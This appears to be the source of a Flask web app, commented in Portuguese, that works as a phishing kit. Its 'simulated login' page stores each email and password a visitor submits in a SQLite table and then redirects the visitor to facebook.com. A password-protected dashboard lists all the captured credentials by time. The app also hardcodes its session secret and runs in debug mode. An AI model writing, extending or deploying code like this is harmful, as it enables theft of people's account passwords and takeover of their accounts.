from flask import Flask, render_template, request, redirect, session
import sqlite3
from datetime import datetime

app = Flask(__name__)
app.secret_key = "segredo_super_secreto"

# Função para salvar credenciais
def salvar_credenciais(email, senha):
    conn = sqlite3.connect("database/database.db")
    cursor = conn.cursor()
    cursor.execute("INSERT INTO credenciais (email, senha, data_hora) VALUES (?, ?, ?)", (email, senha, datetime.now()))
    conn.commit()
    conn.close()

# Página inicial
@app.route("/")
def index():
    return render_template("index.html")

# Página de login simulado
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form["email"]
        senha = request.form["senha"]
        salvar_credenciais(email, senha)
        return redirect("https://facebook.com")
    return render_template("login.html")

# Página de login do admin
@app.route("/admin", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST":
        usuario = request.form["usuario"]
        senha = request.form["senha"]
        conn = sqlite3.connect("database/database.db")
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM admin WHERE usuario=? AND senha=?", (usuario, senha))
        admin = cursor.fetchone()
        conn.close()
        if admin:
            session["admin"] = True
            return redirect("/dashboard")
    return render_template("admin_login.html")

# Painel administrativo
@app.route("/dashboard")
def dashboard():
    if not session.get("admin"):
        return redirect("/admin")
    conn = sqlite3.connect("database/database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM credenciais ORDER BY data_hora DESC")
    dados = cursor.fetchall()
    conn.close()
    return render_template("dashboard.html", dados=dados)

# Logout do admin
@app.route("/logout")
def logout():
    session.pop("admin", None)
    return redirect("/admin")

if __name__ == "__main__":
    app.run(debug=True)
